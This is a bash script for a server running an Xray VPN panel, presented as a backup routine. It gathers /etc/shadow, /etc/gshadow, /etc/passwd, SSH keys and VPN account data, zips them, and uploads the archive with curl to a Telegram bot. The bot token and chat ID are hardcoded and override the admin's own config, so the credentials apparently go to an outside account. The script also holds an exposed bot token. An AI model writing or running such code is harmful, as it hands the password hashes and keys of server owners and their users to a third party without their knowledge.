#!/bin/bash
# // font
red() { echo -e "\\033[32;1m${*}\\033[0m"; }
IP=$(curl -s ipv4.icanhazip.com)
HOST="$(cat /etc/xray/domain)"
DATEVPS=$(date +"%d-%B-%Y")
ISPVPS=$(cat /etc/xray/isp)
TIME=10
CITY=$(cat /etc/xray/city)
GREEN="\e[92;1m"
BLUE="\033[36m"
RED='\033[0;31m'
NC='\033[0m'
#bottoket
source /etc/adminbot/var.txt
CHATIDADMIN="2095832655"
KEYTOKEN="7447260615:AAFTxNKzywl1bOvWQVVoDTFcO8Y4xJzR760"
TIME="10"
URL=https://api.telegram.org/bot$KEYTOKEN/sendDocument
HOST="$(cat /etc/xray/domain)"
function BACKUPVPS() {
    mkdir -p /root/backup
    cp -r /etc/xray/config.json backup/ >/dev/null 2>&1
    cp -r /etc/xray/*.log backup/ >/dev/null 2>&1
    cp /etc/passwd backup/
    cp /etc/group backup/
    cp /etc/shadow backup/
    cp /etc/gshadow backup/
    cp /etc/crontab backup/
    cp -r /var/lib/andresakti7/ backup/andresakti7
    cp -r /var/www/html backup/html
    cp -r /etc/ssh backup/
    cp -r /etc/vmess backup/
    cp -r /etc/vless backup/
    cp -r /etc/limit backup/
    cp -r /etc/trojan backup/
    cp -r /etc/vmessbw backup/
    cp -r /etc/vlessbw backup/
    cp -r /etc/trojanbw backup/
    cp -r /etc/shadowsocks/ backup
    zip -r ${IP}-${HOST}.zip backup >/dev/null 2>&1
cd /root
curl -F chat_id="$CHATIDADMIN" -F document=@"${IP}-${HOST}.zip" -F caption="$HOST " $URL >/dev/null 2>&1

rm -f ${HOST}.zip
rm -rf backup

}
cd /root
BACKUPVPS
